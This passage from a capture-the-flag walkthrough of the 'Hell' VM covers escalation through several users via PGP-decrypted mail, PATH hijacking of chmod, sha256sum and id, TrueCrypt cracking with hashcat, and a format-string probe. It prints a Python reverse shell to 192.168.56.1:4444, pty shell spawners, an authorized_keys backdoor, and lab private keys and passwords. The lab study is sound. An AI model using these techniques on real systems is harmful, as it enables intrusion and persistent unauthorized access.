fAMUxE/bgsv33QXsURtelfuoZRLz/OmwybXpwv+Zen0n8hpjQEAOhqD4eieIxH9j
7W6ijInh9XD8jcnUa4eHw7WDa0LPtyQSbPZB1hZou6z8pAZY0LxhmstpPjSYfdKR
HRjhRuu0tdZ2PrKx1wKooo/iiJdZ0Cgizlu4k76rDrQSamFja0Bjb3dsb3ZlcnMu
Y29tiQEcBBABAgAGBQJToPb/AAoJEL26wSU/GKsKnk0H/iWvOGuWwge8VteqxPip
yu2LwvLzjbHAeWwBmsg69h+Yl5l8Y+3B9aoCpnjM2QmMAFHxVA8L6Z4UIyhNJ90Y
l18rYZec9cDUrflowd/A4QVrJNCV/5kCyPeQ03mzGHnlTTvb/qBMymmpVBeP3JoK
vZkGYzFBmrt7q19b3VcvexLTwtLtch8NUOt6719UFRvxE+EXu4JbItr7dSqfYDbh
zHsfGaeU1hCQJg/n83IRxTBsc7h1jIOxraovzbErqpZ6YeYhCK5oo38dJVpz9Daa
quU6lGTizKWX3HS29HQl+PJvzoHyj3T6Aw71BZF4lZNrJmzxHqhVYuRWptioyTWo
tqg=
=SCkw
&mdash;&mdash;-END PGP PRIVATE KEY BLOCK&mdash;&mdash;&ndash;
$
```</p>

<p>There was also a note in the directory:</p>

<p><code>bash Jacks Note
$ cat note
The usual password as with everything.
</code></p>

<p>With all this information now known to us, and the fact that I know PGP is pretty popular to encrypt files and sign mail, I figured we had to get this key loaded and decrypt something using it. Further enumeration revealed that <code>/var/mail</code> was world readable:</p>

<p>```bash Account details:
$ pwd
/var/mail/jack/received
$ ls -lah
total 12K
drwxr-sr-x 2 root mail 4.0K Jun 18 12:26 .
drwxr-sr-x 3 jack jack 4.0K Jul  5 19:56 ..
-rw-r&mdash;r&mdash; 1 root mail  709 Jun 18 12:26 message.eml
$ cat message.eml
&mdash;&mdash;-BEGIN PGP MESSAGE&mdash;&mdash;&ndash;
Version: BCPG C# v1.6.1.0</p>

<p>hQEMA726wSU/GKsKAQf/ZnGxyaHQ6wMhSzpbn2J2uVKoPFS3tHdnBzJ18kswBwOm
yff3Joe5RTtMgdjydD+37DSg6SikjcdzJiHV3y5QHqxVcNt5xo0BdYNCWoqjdMzJ
3g50VEwMg5DZwLvTmUr4f+CJ7bc/Cv2hHazKXnT7s71lqBLSCCsNwZuWpxYW1OMX
7CNE92QXayltmQ0GLajIMtzmGlszgwQkVjQ2h9wMGelVYHi5hYsEZzIdh6/9Jo24
rerlq1CY6/T70KsY6GyBoU3iKFgsIkwcb6whrlR/6SCK2vNmLlz2AfDSITYY+6vZ
MWXhiYbZSRyHq7gaYRKS6kzG6uLlsyq4YnQzhz8M+sm4dePDBvs7U6yAPJf4oAAH
9o01Fp3IJ1isvVMH5Fr8MwQjOAuo6Yh6TwbOrI/MVpphJQja8gDKVYr2tlqNS5me
V8xJ7ZUxsh67w/5s5s1JgEDQt+f4wckBc8Dx5k9SbS9iRUbZ0oLJ3IM8cUj3CDoo
svsh0u4ZWj4SrLsEdErcNX6gGihRl/xs3qdVOpXtesSvxEQcWHLqtMY94tb29faD
+oQPjG3V4cSY5r566esUAlCn7ooYyx6Dug==
=svWU
&mdash;&mdash;-END PGP MESSAGE&mdash;&mdash;&ndash;
```</p>

<p>I loaded the private GPG key into jacks keyring with:</p>

<p><code>bash Loading Jacks private key
$ gpg --import .pgp/pgp.priv
gpg: keyring `/home/jack/.gnupg/secring.gpg' created
gpg: key 3F18AB0A: secret key imported
gpg: key 3F18AB0A: public key "jack@cowlovers.com" imported
gpg: Total number processed: 1
gpg:               imported: 1  (RSA: 1)
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
</code></p>

<p>Ofc this doesn’t mean I can actually use it yet, however there was a note about the password, so I could possibly just try all the ones I have found so far for jack. Decrypting the encrypted message we found for jack was as simple as:</p>

<p>```bash Decryting Jacks mail
$ gpg /var/mail/jack/received/message.eml</p>

<p>You need a passphrase to unlock the secret key for
user: &ldquo;<a href="&#x6d;&#x61;&#x69;&#108;&#x74;&#x6f;&#58;&#x6a;&#97;&#x63;&#107;&#x40;&#99;&#x6f;&#119;&#x6c;&#x6f;&#118;&#x65;&#114;&#115;&#x2e;&#x63;&#x6f;&#x6d;">&#x6a;&#x61;&#x63;&#x6b;&#64;&#99;&#111;&#x77;&#x6c;&#x6f;&#x76;&#101;&#x72;&#115;&#x2e;&#99;&#111;&#109;</a>&rdquo;</p>

<h1>used the password g0tmi1k69 found in the MySQL database</h1>

<p>2048-bit RSA key, ID 3F18AB0A, created 2014-06-18</p>

<p>gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 2048-bit RSA key, ID 3F18AB0A, created 2014-06-18</p>

<pre><code>  "jack@cowlovers.com"
</code></pre>

<p>gpg: /var/mail/jack/received/message.eml: unknown suffix
Enter new filename [text.txt]:
gpg: WARNING: message was not integrity protected</p>

<p>$ cat text.txt
Ok Jack. I&rsquo;ve created the account &lsquo;milk_4_life&rsquo; as per your request. Please stop emailing me about this now or I&rsquo;m going to talk to HR like we discussed.</p>

<p>The password is &lsquo;4J0WWvL5nS&rsquo;
```</p>

<p>So, lets ssh in as <code>milk_4_life</code>&hellip;</p>

<p>```bash SSH as milk_4_life
root@kali:~# ssh <a href="&#109;&#x61;&#105;&#x6c;&#116;&#x6f;&#58;&#109;&#x69;&#108;&#x6b;&#x5f;&#x34;&#95;&#108;&#x69;&#x66;&#101;&#x40;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#56;&#x2e;&#x35;&#54;&#46;&#x31;&#x30;&#x32;">&#109;&#105;&#108;&#x6b;&#x5f;&#52;&#95;&#x6c;&#105;&#x66;&#101;&#64;&#49;&#x39;&#50;&#46;&#49;&#54;&#56;&#46;&#x35;&#x36;&#x2e;&#x31;&#x30;&#50;</a>
<a href="&#x6d;&#x61;&#105;&#108;&#116;&#111;&#x3a;&#109;&#x69;&#108;&#x6b;&#x5f;&#x34;&#x5f;&#x6c;&#x69;&#x66;&#x65;&#x40;&#x31;&#x39;&#x32;&#x2e;&#49;&#54;&#56;&#x2e;&#x35;&#x36;&#46;&#x31;&#x30;&#x32;">&#x6d;&#x69;&#108;&#x6b;&#95;&#52;&#95;&#108;&#x69;&#102;&#x65;&#64;&#x31;&#x39;&#50;&#46;&#49;&#x36;&#x38;&#x2e;&#x35;&#x36;&#x2e;&#x31;&#x30;&#50;</a>&rsquo;s password:
Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686</p>

<p>The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
$ id
uid=1002(milk_4_life) gid=1002(milk_4_life) groups=1002(milk_4_life)
```</p>

<p>Easy :D</p>

<h2>becoming george</h2>

<p>The user <code>milk_4_life</code> has a <code>game</code> in hes home folder.</p>

<p>```bash milk_4_life game
$ ls -lah game
&mdash;-s&mdash;x&mdash;x 1 george george 5.7K Jun 19 18:24 game</p>

<p>$ ./game
I&rsquo;m listening
```</p>

<p>Not a very interesting game thus far. I decided to quit and rerun the game, this time backgrounding it with <code>&amp;</code>. At this stage I wanted to run a netstat to see if it is <em>listening</em> on a port or something, but the netstat command was not available. I figured I could cause a error as the same port can not be opened twice. So, with <code>./game &amp;</code> already running, another instance of <code>./game</code> errored out, revealing the listening port:</p>

<p>```bash Game TCP port
$ ./game &amp;
I&rsquo;m listening</p>

<p>$ ./game
Traceback (most recent call last):
  File &ldquo;/usr/bin/game.py&rdquo;, line 58, in <module></p>

<pre><code>tcpSocket.bind(("0.0.0.0", 1337))
</code></pre>

<p>  File &ldquo;/usr/lib/python2.7/socket.py&rdquo;, line 224, in meth</p>

<pre><code>return getattr(self._sock,name)(*args)
</code></pre>

<p>socket.error: [Errno 98] Address already in use
Lol nope
$
```</p>

<p>tcp/1337 it is. Lets telnet to this:</p>

<p>```bash Game Interface
milk_4_life@hell:~$ telnet 127.0.0.1 1337
Trying 127.0.0.1&hellip;
Connected to 127.0.0.1.
Escape character is &lsquo;^]&rsquo;.
Type &lsquo;START&rsquo; to begin</p>

<p>START
Starting&hellip;</p>

<p>You have 30 seconds to get as many points as you can, beat the high score! (High Score: 133723)</p>

<p>Quick what&rsquo;s&hellip; 397 x 358? 1
Quick what&rsquo;s&hellip; 498 x 111? 2
Quick what&rsquo;s&hellip; 740 x 772?
Final Score: 0</p>

<p>Connection closed by foreign host.
milk_4_life@hell:~$
```</p>

<p>Typing anything other than <code>START</code> would simply cause the script to die. Typing a non integer as a answer causes a loop, and that is about it.
Sooo, time to win this game and see what would happen. I decided to attempt this with a python script. The general idea would be to read the socket output, calculate the answer and send that back. This resulted in a script as follows (yeah I know its not perfect but gets the job done):</p>

<p>```python play_game.py</p>

<h1>!/usr/bin/python</h1>

<p>import socket, sys</p>

<h1>start a socket</h1>

<p>sock = socket.socket()</p>

<h1>connect locally</h1>

<p>sock.connect((&lsquo;127.0.0.1&rsquo;, 1337))
ret = sock.recv(1024)   # read 1024 bytes
print &lsquo;[I] %s&rsquo; % ret.strip()</p>

<h1>start the game</h1>

<p>print &lsquo;[O] START&rsquo;
sock.send(&lsquo;START\n&rsquo;) # START the game
ret = sock.recv(1024)   # read 1024 bytes
print &lsquo;[I] %s&rsquo; % ret.strip()</p>

<h1>Start reading the socket input and calculating answers sending them back</h1>

<p>while True:
   ret = sock.recv(1024)
   print &lsquo;[I] %s&rsquo; % ret.strip()</p>

<p>   # split by spaces
   ret = ret.split(&lsquo; &rsquo;)</p>

<p>   # a question line
   if ret[0] == &lsquo;Quick&rsquo;:</p>

<pre><code>  # extract the 2 integers from:
  # ['Quick', "what's...", '435', 'x', '574?', '']
  one = int(ret[2])
  two = int(ret[4].replace('?',''))   # remove the comma
  answer = one * two
  print '[O] Answer %s' % answer
  sock.send(str(answer) + '\n')
</code></pre>

<p>   # once the 30 seconds passes, a line with Final will return. This
   # is the end of the game
   elif ret[0] == &lsquo;Final&rsquo;:</p>

<pre><code>  print 'Done?'
  sock.close()
  sys.exit(0)
</code></pre>

<p>   # if we dont know what to do, just &lsquo;press enter&rsquo;
   else:</p>

<pre><code>  sock.send('\n')
</code></pre>

<p>sock.close()
```</p>

<p>I ran this in another session with <code>./game</code> running and won :P Once you win, the output results in:</p>

<p>```bash Game Win Output
!<em>!</em>!<em>!</em>! Congratulations, new high score (302785) !<em>!</em>!<em>!</em>!</p>

<p>I hear the faint sound of chmodding&hellip;&hellip;.
```</p>

<p>&hellip; and ends. Heh, ok. Well that was probably not exactly what I hoped for, but nonetheless, the chmodding is at least a hint. The first thing that came to mind is a important file that was previously not available now possibly is as its been chmodded by <code>george</code> after winning the game. Or, if it is in fact a chmod that is being run, is it being called via a system command from its full path (/usr/bin/chmod), or just via chmod?</p>

<p>To test, I fired up another editor on <code>chmod.py</code> and just put a line to echo test. I <code>chmod +x</code> this and moved the file to <code>/tmp</code>. I then added <code>/tmp</code> to <code>PATH</code> via <code>export PATH=/tmp:$PATH</code>:</p>

<p><code>bash Testing chmod path resolve
milk_4_life@hell:~$ python chmod.py          # test the script
Testing chmod exec
milk_4_life@hell:~$ cp chmod.py /tmp/chmod   # copy it to /tmp
milk_4_life@hell:~$ chmod +x /tmp/chmod      # make it executable
milk_4_life@hell:~$ /tmp/chmod               # test it
Testing chmod exec
milk_4_life@hell:~$ export PATH=/tmp:$PATH   # prefix PATH with /tmp
milk_4_life@hell:~$ chmod                    # test it without full path
Testing chmod exec
milk_4_life@hell:~$ ./game                   # start the game
I'm listening
Testing chmod exec                           # profit :)
</code></p>

<p>With it confirmed that <code>chmod</code> was not called from its full path once you win the game (using our previously mentioned winning script :D), it was time to edit our <code>chmod</code> script to be slightly more useful:</p>

<p>```python Evil chmod</p>

<h1>!/usr/bin/python</h1>

<p>import pty
pty.spawn(&lsquo;/bin/sh&rsquo;)
```</p>

<p>With this now in /tmp/chmod, I reran <code>./game.py</code>, and then <code>./play_game.py</code>. After 30 seconds on the session we started the game we had:</p>

<p><code>bash George's permissions
milk_4_life@hell:~$ ./game
I'm listening
$ id
uid=1002(milk_4_life) gid=1002(milk_4_life) euid=1000(george) groups=1000(george),1002(milk_4_life)
$
</code></p>

<p>Profit! We now have access to <code>george</code>&rsquo;s home directory :) In order to make the next steps easier, I quickly generated a new ssh key pair using <code>ssh-keygen</code>, and added the contents of the resultant <code>id_rsa.pub</code> to <code>.ssh/authorized_keys</code>. Whats important to note in the below snippet is that the full path of <code>chmod</code> is used. If we don’t, we will be hitting the chmod we just fooled to get to this shell in the first place :D</p>

<p><code>bash Adding ssh key to George's authorized_keys
$ id
uid=1002(milk_4_life) gid=1002(milk_4_life) euid=1000(george) groups=1000(george),1002(milk_4_life)
$ cd /home/george
$ mkdir .ssh
$ /bin/chmod 755 .ssh
$ cd .ssh
$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3KB7V05tHJAWFavTgTK1dDIcUUVyUpZA3TYQhydNjeexWDeVzPNUGCo3/XZNgqw0QpaoX5eLm9k9OqxNyr7x5B6Rq2F7ykA0DHglbM4DLJDQRawHgoCzTwxBWAMva3HUbahounJFe9fOaECGZEsCmTF1462wTuZ/SYOO9lSHv38cO8b9nC5lteBz2An34+W/n9X1sxBAlDAHyXmAqJYpoE+gur+YX8j3WPNJbiBu3nVnvpDaR1BnvN1n74/yUtLYziT5Gt7lgRWiaDhzslR+46xbu/YmCyO03ztHhD/lD2JAcoEe43FKFUdh8ZGfBqCq0CbBB86KHhhLzV6QjLHjV root@kali" &gt; authorized_keys
$ /bin/chmod 600 authorized_keys
</code></p>

<p>Now we can SSH into the VM as <code>george</code></p>

<p>```bash SSH Access as george
root@kali:~# ssh <a href="&#x6d;&#x61;&#105;&#108;&#x74;&#x6f;&#x3a;&#x67;&#x65;&#111;&#x72;&#x67;&#101;&#x40;&#x31;&#57;&#x32;&#46;&#x31;&#x36;&#56;&#x2e;&#x35;&#54;&#46;&#49;&#x30;&#50;">&#x67;&#101;&#111;&#114;&#103;&#101;&#64;&#x31;&#57;&#50;&#46;&#x31;&#54;&#x38;&#46;&#53;&#54;&#46;&#49;&#48;&#50;</a> -i id_rsa
Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686</p>

<p>The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
No mail.
Last login: Sat Jul  5 19:26:25 2014
george@hell:~$
```</p>

<h2>becoming bazza</h2>

<p>George&rsquo;s home directory had what looked like a TrueCrypt container <code>4.0M Jun 19 21:09 container.tc</code> in hes home directory. TrueCrypt appeared to be installed on the VM, and attempting to mount the container failed due to an invalid keyfile and or password.</p>

<p><code>george</code> also had mail in <code>/var/mail</code>:</p>

<p>```bash George&rsquo;s Signup Mail
george@hell:~$ cat /var/mail/george/signup.eml
From: <a href="&#x6d;&#x61;&#x69;&#108;&#116;&#x6f;&#x3a;&#97;&#100;&#x6d;&#105;&#x6e;&#x40;&#114;&#x6f;&#99;&#x6b;&#121;&#111;&#x75;&#46;&#x63;&#x6f;&#x6d;">&#x61;&#x64;&#109;&#x69;&#110;&#64;&#114;&#x6f;&#x63;&#x6b;&#121;&#111;&#117;&#x2e;&#99;&#111;&#109;</a>
To: <a href="&#109;&#x61;&#x69;&#x6c;&#116;&#x6f;&#58;&#115;&#x75;&#x70;&#101;&#114;&#95;&#97;&#100;&#x6d;&#105;&#x6e;&#x40;&#104;&#x65;&#x6c;&#x6c;&#46;&#x63;&#x6f;&#109;">&#115;&#117;&#x70;&#101;&#114;&#95;&#x61;&#x64;&#x6d;&#x69;&#x6e;&#x40;&#104;&#101;&#108;&#x6c;&#46;&#99;&#x6f;&#109;</a>
Subject: Account Activation
Date: 13th November 2009</p>

<p>Thanks for signing up for your account. I hope you enjoy our services.
george@hell:~$
```</p>

<p>There is a mention of <em>rockyou</em> in the From address. There is a famous rockyou wordlist used for password cracking out in the wild. With that in mind, and the fact that it was 0430 already, I decided to copy the <code>container.tc</code> to my Kali Linux install, and have <code>truecrack</code> have a go at it while I catch up on some much deserved sleep.</p>

<h3>fast forward a few hours</h3>

<p>A few hours passed, with 0 luck on cracking the password for the container. I started to realize that this <em>may</em> not be the correct path in getting the container open, assuming that is the next step. However, as a last resort, I opted to copy the files onto my Windows gaming PC and run it via a GPU cracker, <a href="http://hashcat.net/oclhashcat/">oclHashcat</a>.</p>

<p>```bash Windows ocl hashcat
C:\Users\Somedude\Downloads\oclHashcat-1.21\oclHashcat-1.21>oclHashcat64.exe
-m 6211 C:\Users\Somedude\Desktop\Hell\container.tc C:\Users\Somedude\Desktop\Hell\rockyou.txt</p>

<p>[snip]</p>

<p>C:\Users\Somedude\Desktop\Hell\container.tc:letsyouupdateyourfunnotesandmore</p>

<p>Session.Name&hellip;: oclHashcat
Status&hellip;&hellip;&hellip;: Cracked
Input.Mode&hellip;..: File (C:\Users\Somedude\Desktop\Hell\rockyou.txt)
Hash.Target&hellip;.: File (C:\Users\Somedude\Desktop\Hell\container.tc)
Hash.Type&hellip;&hellip;: TrueCrypt 5.0+ PBKDF2-HMAC-RipeMD160 + AES
Time.Started&hellip;: Sun Jul 20 14:26:08 2014 (19 secs)
Speed.GPU.#1&hellip;:    14578 H/s
Speed.GPU.#2&hellip;:    16165 H/s
Speed.GPU.#*&hellip;:    30743 H/s
Recovered&hellip;&hellip;: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
Progress&hellip;&hellip;.: 563201/14343297 (3.93%)
Skipped&hellip;&hellip;..: 0/563201 (0.00%)
Rejected&hellip;&hellip;.: 1/563201 (0.00%)
HWMon.GPU.#1&hellip;: 64% Util, 54c Temp, 43% Fan
HWMon.GPU.#2&hellip;:  0% Util, 90c Temp, 100% Fan</p>

<p>Started: Sun Jul 20 14:26:08 2014
Stopped: Sun Jul 20 14:26:42 2014
```</p>

<p>About 19 seconds later, we have the password thanks to hashcat!</p>

<p>So, lets mount the container and see whats inside:</p>

<p>```bash george TrueCrypt container
george@hell:~$ truecrypt container.tc
Enter mount directory [default]:
Enter password for /home/george/container.tc: letsyouupdateyourfunnotesandmore
Enter keyfile [none]:
Protect hidden volume (if any)? (y=Yes/n=No) [No]:</p>

<p>george@hell:~$ cd /media/truecrypt1/
george@hell:/media/truecrypt1$ ls -lah
total 22K
drwx&mdash;&mdash;&mdash; 2 george george  16K Jan  1  1970 .
drwxr-xr-x 4 root   root   4.0K Jul 21 18:50 ..
-rwx&mdash;&mdash;&mdash; 1 george george 1.7K Jul  5 20:01 id_rsa
george@hell:/media/truecrypt1$ cat id_rsa
&mdash;&mdash;-BEGIN RSA PRIVATE KEY&mdash;&mdash;&ndash;
MIIEpQIBAAKCAQEAxlCbg0ln2dqRO3iIXPUvK3irg/9l5uvBAQdXTVmcm/JWN9OA
25XtZX8LOfiJtc+8OYXgD6lXNVPh9BjElq6qpR7fk1TaXXUlyiSlwCxz68n/cpYs
f6UUa9QXm0LSHD8m7g/e5qqIm8bb15TIC6+8TmSB11FE9NLPN+8hVyP1S9EBntom
t5watKDFUNF+mcl14Tj+INcWB2qpEPgZ1mIwq1Zw3w/vy27y0i1r52+fot1vgf2K
Ymo6GipsdxW1k/UuCjJEE6e0GZFA8vhpH5F4MG8k33vIPqkxgEgF0GX8RPAQF/Xf
gxERhkGP+hVOd8b11OXzxWGGQyqwOYF8+7qVjwIDAQABAoIBAQCyldpFUvBDXbEV
dgiOdXkh04vY1UBlv/3ROFQk4sLGKGf94+gRViUvFkX80VTptgWRY36Pe/Z9nmlG
0JsP+oDPK0s4uNvf92Otcm0U7rMBLals/dFarUUDiT4s4fKl3zTmgsI+xGk6psxI
icHPzFRt39KRHK1VLxXOD/jdKRN3Tk0odH1kNahOuFC2F5T+aqdlC/RAGwxnTDBe
AFPFlns83GaPYlIt05DZsdGftG7mITkNfUVS5AIyeedshU4OyPXu5bGgUgbtars4
GdttJ33Tm5hO+n3E93sW7XMKG4v4po+1Fu0OwNQNpaRo6gVqK7AZHNPxBRW7K4Zc
w2d0EXehAoGBAOQgtqb5QVyhiCdT53xjZTMHH74ApWRpsoLtu/LaZnQV0v/dzEIv
jei58v/PusXsSwOQeb4p2obOReQFbYG48vCiywwMbeOeqH2d69HYatHmxPXngKS3
6trus/pHuDJosFw1qhgVo9ao0o8IH6cveHidmwvzKfiphgM3yCXF9jyxAoGBAN6L
awHXmHQCsCq//UbHbfuaBScJOpaagKP1BIskl5RDaQ/U/DzSpxju0ldedX7HYVFW
Rk6NQQ6QiXIC/5D7Xj+tcR2EFI+Tt9xp6dE/UlxpUL1h9QCBfmdw0CT9WSwJEGF7
R+D18trKcb/NkYdJV8ZpaT00rLzyBx5MY/FZbYY/AoGBALrCwWXfR5BjOckgmrGt
2cq1uVnew4h6M8eWgzklbZz5xPzuAuvobKAro3GkCb9BXIQ1gkWZlCqqsnMjsmvy
EwnH7L0Xa9teJ4h3gfkQ2Rqwd2ztstanLyE/LJ7omjbCmCdVU8RV6wSwv3iTaP6B
EXqFZMqarzDA8FKwFy49bAJxAoGBALkXBYG7uW1LSw/TLCjw9zVaTUzBLTxS9gjn
YMcFQRir1Da5sqw3m4huIP1Pb7NoyjTm54SvkNs3NUlg2wPPPP0DGOAumRctCa9F
W5WP78UyRlesoCOyj9oihsss9zxbsYcSDJ86j6iO1Xpr08zMIDfCNigUplJjja4S
ZNE3ypLrAoGAbp+vBcqQRfnXWfmcdnHYFbwgWbokPSe2fScajWiyvcg4/6gL1e50
rpO3RTOREUD02pBbyG4LDFv7x/5niqASL0tS8/0xWDBDj5QmD9UTmMd5hsMbj8Lw
qJA0ErZEjIE9+jXYLbsTsB8tRTsqMqBfCCovHXAjy0h5B6j500PfImM=
&mdash;&mdash;-END RSA PRIVATE KEY&mdash;&mdash;&ndash;
george@hell:/media/truecrypt1$
```</p>

<p>So, a rsa private key. A wild shot in the dark sais this is the private key for one of the other users as per the <code>/etc/passwd</code>. I saved the key to a file on my Kali Linux box and attempted to SSH in as <code>bazza</code>, specifying the private key to use:</p>

<p>```bash ssh access as Bazza
root@kali:~# ssh <a href="&#109;&#97;&#x69;&#108;&#116;&#111;&#x3a;&#98;&#x61;&#x7a;&#x7a;&#x61;&#x40;&#49;&#x39;&#x32;&#46;&#x31;&#x36;&#x38;&#46;&#53;&#x36;&#46;&#x31;&#x30;&#x32;">&#x62;&#x61;&#122;&#x7a;&#x61;&#x40;&#x31;&#x39;&#x32;&#x2e;&#49;&#x36;&#x38;&#x2e;&#53;&#54;&#46;&#49;&#48;&#50;</a> -i truecrypt_id_rsa
Linux hell 3.2.0-4-486 #1 Debian 3.2.57-3+deb7u2 i686</p>

<p>The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Jul 21 18:52:50 2014 from 192.168.56.1
$ id
uid=1004(bazza) gid=1004(bazza) groups=1004(bazza)
$
```</p>

<h2>becoming oj</h2>

<p><code>bazza</code> had 2 interesting files in hes home directory:</p>

<p><code>bash Bazza Home
bazza@hell:~$ ls -lh
total 20K
-rw-r--r-- 1 root root        109 Jul  6 18:32 barrebas.txt
-r-xr-sr-x 1 oj   developers 6.1K Jul  6 18:39 part1
-r-sr-xr-x 1 oj   oj         5.2K Jul  6 18:34 part2
</code></p>

<p>The <code>barrebas.txt</code> looks to be a shoutout to the tester of the vulns. <code>part1</code> &amp; <code>part2</code> from first glance had interesting permissions, and made it relatively easy to determine that the next user we should be after this is <code>oj</code>. Running <code>part1</code> and <code>part2</code>:</p>

<p>```bash bazza puzzle
bazza@hell:~$ ./part1
Checking integrity of part2&hellip; Done!!</p>

<p>Checking integrity of calling target&hellip; Done!!</p>

<p>Binary and target confirmed.</p>

<p>Can&rsquo;t touch this <em>nah na na na na naaaaaaaa nah</em>
uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)</p>

<p>bazza@hell:~$ ./part2</p>

<p>Error! 1004 ID detected &hellip; youre not allowed to run this, please use part 1!
bazza@hell:~$
```</p>

<p>So it seems that part2 is protected apparently due to the fact that our uid (or groupid?) of 1004 was not allowed. Slightly cryptic, but a few thoughts about what the binaries are doing were already going about. <code>part1</code> outputs what looks like the output of the <code>id</code> command too.</p>

<p>Again, this part took some time and resulted in a rabbit-hole scenario of try something, google something, try something, google something. I am not going to go through everything I have tried for this part, but simply try depict how I managed to figure this out in the end.</p>

<p>We start with a <code>strings</code> of <code>part1</code>:</p>

<p><code>bash part1 strings
bazza@hell:~$ strings part1
/lib/ld-linux.so.2
__gmon_start__
libc.so.6
_IO_stdin_used
puts
popen
printf
fgets
system
pclose
strcmp
__libc_start_main
GLIBC_2.1
GLIBC_2.0
PTRh
QVhl
[^_]
900462fbf9593f1a4b753f1729c431abc80932a151e9b293e13822a91f9641c1  /home/bazza/part2
1003a011c5bdb65a07a8f92feb6b7d7ecbf3a3ff0f2a46abbe5c777c525996d8  /usr/bin/id
Checking integrity of part2...
sha256sum /home/bazza/part2
Failed to run command
 Done!!
Checking integrity of calling target...
sha256sum /usr/bin/id
Uh oh.... Corrupted or in wrong directory (/home/bazza/)
 Done!!
Binary and target confirmed.
/home/bazza/part2
Target corrupt
;*2$"
</code></p>

<p>This should give you a pretty good idea of what is potentially going on in the binary, like:</p>

<ul>
<li> Check the sha256sum of /gome/bazza/part matches 900462fbf9593f1a4b753f1729c431abc80932a151e9b293e13822a91f9641c1</li>
<li> Check the sha256sum of /usr/bin/id matches 1003a011c5bdb65a07a8f92feb6b7d7ecbf3a3ff0f2a46abbe5c777c525996d8</li>
<li> Eventually Fail if these don’t match.</li>
</ul>


<p>The key lies in the fact that the <code>sha256sum</code> command does not appear to be called from its full path location ie: /usr/bin/sha256sum. So, similar to how we fooled the <code>chmod</code> earlier, we are going to do exactly the same with the <code>sha256sum</code>.</p>

<p>As before, we create a <em>evil sha256sum</em> command, which is actually just a python script to spawn <code>/bin/sh</code>, then prefix <code>PATH</code> with <code>/tmp</code> and run <code>./part1</code>. For this one however, I was having trouble with the pty.spawn() and didn&rsquo;t really feel like troubleshooting that much. So I opted for a (reverse shell)[<a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a>] payload instead to open on a netcat listener that I have on my host laptop:</p>

<p>```python Reverse Shell</p>

<h1>!/usr/bin/python</h1>

<p>import socket,subprocess,os</p>

<p>s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((&ldquo;192.168.56.1&rdquo;,4444))</p>

<p>os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)</p>

<p>p = subprocess.call([&ldquo;/bin/sh&rdquo;,&ldquo;-i&rdquo;])
```</p>

<p>I spawned a <code>netcat</code> listener on my laptop using <code>nc -l 4444</code>, and ran <code>./part1</code>:</p>

<p><code>bash Answered netcat
→ nc -l 4444
$ id
uid=1004(bazza) gid=1004(bazza) egid=1003(developers) groups=1004(bazza)
</code></p>

<p>Notice that I was now in the <code>developers</code> group. I was now allowed to run <code>./part2</code> too&hellip; with a verbose line showing me the permissions I would need to gain access to <code>/home/oj</code>:</p>

<p>```bash bazza Part2 test
$ ./part2
uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)</p>

<p>Can&rsquo;t touch this <em>nah na na na na naaaaaaaa nah</em>
$
<code>``
And, as expected, I spent some time on this binary too. I didn't expect</code>part2<code>to be any easier :P
After taking a break, I realized that the output that looks like that of</code>/usr/bin/id<code>, probably **is** that if it. So, off I went and did another</code>sha256sum<code>, type script, this time just with another reverse shell to port 4445, and naming it</code>id` so that part2 will pick it up:</p>

<p>```bash bazza Part2 reverse shell
→ nc -l 4445
$ /usr/bin/id
uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)</p>

<p>$ cd /home/oj
$ ls -lh
total 584K
-r-sr-xr-x 1 root root 579K Jul  5 21:12 echo
-rw-r&mdash;r&mdash; 1 root root  154 Jul  5 21:06 How to be an infosec rockstar 101.txt
$
```</p>

<p>And there we are! Group membership for <code>oj</code>, and access to <code>/home/oj</code></p>

<h2>becoming root</h2>

<p>As with all of the other users, I added myself a ssh key for easy access.</p>

<p>Now, sadly I have to admit that this is as far as I have been able to come. <code>oj</code> has a binary called <code>echo</code> (not to be confused with the builtin echo), that, as expected, will echo what you input.</p>

<p><code>bash oj's echo
oj@hell:~$ ./echo onetwothree
onetwothree
oj@hell:~$
</code></p>

<p>I toyed with the inputs and noticed that when I entered inputs prefixed with a %, some strange stuff started to happen. Google helped me towards learning that this is what is called a <a href="https://www.owasp.org/index.php/Format_string_attack">Format String Attack</a></p>

<p><code>bash Format String Thing
oj@hell:~$ ./echo %08x.%08x.%08x
080488c0.bffffcf8.00000000
oj@hell:~$
</code></p>

<p>I am however satisfied that I have come this far, and will definitely endeavor to nail this format string vuln sometime. But that time is not now.</p>

<p><strong>Edit:</strong> One way to root the machine is to make use of the fact that you can run <code>truecrypt</code> as <code>root</code>, and provide a evil container, spawning you a <code>root</code> shell. An example of this can be seen <a href="http://vinicius777.github.io/blog/2014/07/14/truecrypt-privilege-escalation/">here</a> (and actually references this VM)</p>

<h2>summary</h2>

